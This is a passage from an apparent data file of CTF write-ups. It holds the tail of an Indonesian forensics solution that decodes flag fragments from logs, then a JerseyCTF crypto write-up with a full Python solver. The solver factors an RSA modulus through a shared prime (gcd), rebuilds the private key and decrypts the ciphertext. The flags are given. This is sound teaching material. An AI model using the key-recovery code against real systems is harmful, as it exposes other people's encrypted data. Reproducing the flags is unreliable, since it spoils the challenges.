        "content": "Dari event Application di WS01, ada jejak:\n- `\\\\gate-archive\\shared\\ops\\lease-756e31745f7761735f.lnk`\n\nBagian hex `756e31745f7761735f` di-decode ASCII menjadi:\n- `un1t_was_`"
      },
      {
        "title": "b) Fragmen dari PowerShell payload (DC01-SHIPLINK)",
        "content": "Pada artefak PowerShell/Sysmon DC01-SHIPLINK, ada variabel:\n- `NAV-DRV-dGgzX3RocjNhdF8`\n\nDecode base64 `dGgzX3RocjNhdF8` menghasilkan:\n- `th3_thr3at_`"
      },
      {
        "title": "c) Fragmen dari AD description update (DC01-ORIONHQ Sysmon EncodedCommand)",
        "content": "Saya extract script `-EncodedCommand` dari Sysmon lalu decode UTF-16LE.\nScript tersebut berisi:\n- `Override fragment 04/05: all_al0`"
      },
      {
        "title": "d) Fragmen penutup dari event log message (DC01-ORIONHQ Sysmon EncodedCommand)",
        "content": "Encoded script lain menulis event warning dan menyebut:\n- `Override fragment 05/05: ng}`"
      },
      {
        "title": "5) Kesimpulan Singkat",
        "content": "Pelaku menyebar potongan override key lintas sumber forensik (DNS C2 label, artefak endpoint, dan perubahan AD metadata). Tanpa korelasi lintas PCAP + EVTX, flag tidak akan utuh."
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{nav_un1t_was_th3_thr3at_all_al0ng}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-crypto-relayartifacttx-7",
    "title": "CTF Writeup — Relay Artifact TX-7",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Crypto  \n**Difficulty:** Medium  \n**Flag:** `JCTF{INDIRECT_CONTROL_IS_THE_ONLY_CONTROL}`",
    "problemDescription": "**Event:** JerseyCTF  \n**Category:** Crypto  \n**Difficulty:** Medium  \n**Flag:** `JCTF{INDIRECT_CONTROL_IS_THE_ONLY_CONTROL}`\n\n---",
    "tools": [
      "openssl",
      "Python (",
      "xxd"
    ],
    "analysis": "### Vulnerability Summary\n\n| # | Technique | Detail |\n|---|---|---|\n| 1 | **RSA Prime Reuse / Shared Factor** | `relay_fingerprint` shares a prime with public modulus `n`, enabling `gcd(n, fingerprint)` attack |\n| 2 | **Deterministic Private-Key Recovery** | Once `p,q` are known, compute `d` and decrypt ciphertext directly |\n\n---",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Relay node TX-7 was recovered from a decommissioned corridor between the outer and inner system. Diagnostics show it prepared a final transmission but never sent it - the relay restrained itself. Reconstruct what TX-7 was trying to say; its last unsent message may point toward the only viable route inward.\n\n**Files:**\n- `relay_pub.pem`\n- `relay_diag.json`\n- `relay_notes.log`\n- `tx_fragment.bin`\n- `unsent_notice.log`\n\n---"
      },
      {
        "title": "Reconnaissance",
        "content": "### Step 1 — Basic Artifact Review\n\n```bash\nls -la\n```\n\nInteresting clues:\n- `relay_pub.pem` contains an RSA public key.\n- `tx_fragment.bin` size is 384 bytes (matches RSA-3072 ciphertext length).\n- `relay_diag.json` has a huge hex field: `relay_fingerprint`.\n- `relay_notes.log` explicitly says: **\"Prime reuse flagged but ignored.\"**\n\n### Step 2 — Inspect RSA Public Key\n\n```bash\nopenssl rsa -pubin -in relay_pub.pem -text -noout\n```\n\nResult summary:\n- Public key is ~3072-bit RSA\n- Exponent `e = 65537`\n\n### Step 3 — Identify the Crypto Weakness\n\nThe log hints at weak entropy and prime reuse. A common failure pattern:\n- target modulus `n = p*q`\n- another value accidentally shares one prime (e.g. also divisible by `p`)\n- then `gcd(n, other_value) = p`\n\n`relay_diag.json` contains `relay_fingerprint`, a 3072-bit integer-like hex blob, perfect candidate for GCD attack.\n\n---"
      },
      {
        "title": "Exploitation",
        "content": "### Step 4 — Recover Prime via GCD\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom math import gcd\nimport json\n\nkey = RSA.import_key(open(\"relay_pub.pem\", \"rb\").read())\nn = key.n\nf = int(json.load(open(\"relay_diag.json\"))[\"relay_fingerprint\"], 16)\n\np = gcd(n, f)\nq = n // p\n```\n\nThis produced a non-trivial factor (`1 < p < n`), so factorization succeeded instantly.\n\n### Step 5 — Rebuild Private Exponent and Decrypt\n\n```python\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\n\nct = open(\"tx_fragment.bin\", \"rb\").read()\nc = int.from_bytes(ct, \"big\")\nm = pow(c, d, n)\n```\n\nThe decrypted block starts with `00 02 ... 00`, indicating **PKCS#1 v1.5 encryption padding**. After removing padding, plaintext is readable text containing the flag.\n\n### Step 6 — Extract Flag\n\nRecovered plaintext includes:\n\n```\nRelay Transmission — UNSENT\n...\nJCTF{INDIRECT_CONTROL_IS_THE_ONLY_CONTROL}\n```\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "```\nrelay_pub.pem + relay_diag.json + tx_fragment.bin\n                │\n                ▼\nExtract n,e and relay_fingerprint\n                │\n                ▼\np = gcd(n, relay_fingerprint)\n                │\n                ▼\nq = n/p, phi = (p-1)(q-1), d = e^{-1} mod phi\n                │\n                ▼\nRSA decrypt tx_fragment.bin\n                │\n                ▼\nPKCS#1 v1.5 unpad\n                │\n                ▼\nJCTF{INDIRECT_CONTROL_IS_THE_ONLY_CONTROL}\n```\n\n---"
      },
      {
        "title": "Installation",
        "content": "```bash\n# Optional: activate provided environment\nsource /home/nata/ctf_env/bin/activate\n\n# Run solver\npython3 solve.py\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom math import gcd\r\nimport json\r\nimport re\r\nfrom Crypto.PublicKey import RSA\r\n\r\n\r\ndef main() -> None:\r\n    pub = RSA.import_key(open(\"relay_pub.pem\", \"rb\").read())\r\n    n, e = pub.n, pub.e\r\n\r\n    diag = json.load(open(\"relay_diag.json\", \"r\", encoding=\"utf-8\"))\r\n    fingerprint = int(diag[\"relay_fingerprint\"], 16)\r\n\r\n    # Prime reuse: modulus and fingerprint share one prime factor.\r\n    p = gcd(n, fingerprint)\r\n    if p in (1, n):\r\n        raise RuntimeError(\"GCD attack failed: no shared prime factor found\")\r\n    q = n // p\r\n\r\n    phi = (p - 1) * (q - 1)\r\n    d = pow(e, -1, phi)\r\n\r\n    ct = open(\"tx_fragment.bin\", \"rb\").read()\r\n    c = int.from_bytes(ct, \"big\")\r\n    m = pow(c, d, n)\r\n\r\n    k = (n.bit_length() + 7) // 8\r\n    pt = m.to_bytes(k, \"big\")\r\n\r\n    # PKCS#1 v1.5 unpadding for encryption block type 2.\r\n    if not pt.startswith(b\"\\x00\\x02\"):\r\n        raise RuntimeError(\"Unexpected plaintext format (not PKCS#1 v1.5 block type 2)\")\r\n    sep = pt.find(b\"\\x00\", 2)\r\n    if sep < 0:\r\n        raise RuntimeError(\"Invalid PKCS#1 v1.5 padding: separator not found\")\r\n\r\n    msg = pt[sep + 1 :]\r\n    print(msg.decode(\"utf-8\", errors=\"replace\"))\r\n\r\n    match = re.search(rb\"[A-Za-z0-9_]+\\{[^}]+\\}\", msg)\r\n    if not match:\r\n        raise RuntimeError(\"Flag pattern not found\")\r\n\r\n    flag = match.group().decode()\r\n    print(f\"\\n<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "JCTF{INDIRECT_CONTROL_IS_THE_ONLY_CONTROL}",
    "lessonsLearned": ""
  }
];
